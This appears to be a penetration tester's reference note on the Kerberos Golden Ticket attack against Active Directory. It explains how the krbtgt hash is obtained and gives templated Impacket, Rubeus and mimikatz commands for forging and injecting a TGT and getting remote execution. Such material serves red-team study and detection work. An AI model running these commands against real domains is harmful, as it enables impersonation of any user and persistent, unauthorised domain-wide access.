# Overview
A Golden Ticket attack involves forging a [[88 - Kerberos]] **Ticket Granting Ticket (TGT)** using the *NTLM* hash of the **krbtgt** account, the secret key used by the **Key Distribution Centre (KDC)** to sign all TGTs. With a valid Golden Ticket, an attacker can impersonate any user, including domain administrators, and gain unrestricted access to domain resources. This technique grants long-term persistence within an Active Directory environment and is particularly difficult to detect without careful monitoring.

## Acquiring NTLM hash of krbtgt
To acquire the *NTLM* hash of the **krbtgt** account, one may use various methods. 
- The hash can be extracted from the **Local Security Authority Subsystem Service (LSASS) process** or the **NT Directory Services (NTDS.dit) file** located on any Domain Controller (DC) within the domain.
- One can also execute a [[DCSync]] attack.

## Prerequisites
- Having the *NTLM* hash of the **krbtgt** account.

## Tools
- [Impacket - ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- [Impacket - psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
- [Rubeus Release](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_x64/Rubeus.exe)
- [mimikatz](https://github.com/gentilkiwi/mimikatz)

# Exploit
## Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache

python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

## Windows
```powershell
# Rubeus
Rubeus.exe golden /user:<USER> /domain:<DOMAIN> /sid<DOMAIN_SID> /rc4:<KRBTGT_NTHASH> /ptt

# mimikatz
## with an NT hash
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<KRBTGT_NTHASH> /user:<USER> /ptt
## with an AES 128 key
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes128:<KRBTGT_AES128> /user:<USER> /ptt
## with an AES 256 key
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /user:<USER> /ptt
```
For both `mimikatz` and `Rubeus`, the `/ptt` flag is used to automatically inject the ticket.

# References
- [https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/golden-ticket.html](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/golden-ticket.html)
- [https://www.crowdstrike.com/en-gb/cybersecurity-101/cyberattacks/golden-ticket-attack/](https://www.crowdstrike.com/en-gb/cybersecurity-101/cyberattacks/golden-ticket-attack/)
- [https://www.netwrix.com/how_golden_ticket_attack_works.html](https://www.netwrix.com/how_golden_ticket_attack_works.html)
- [https://www.stationx.net/golden-ticket-attack/](https://www.stationx.net/golden-ticket-attack/)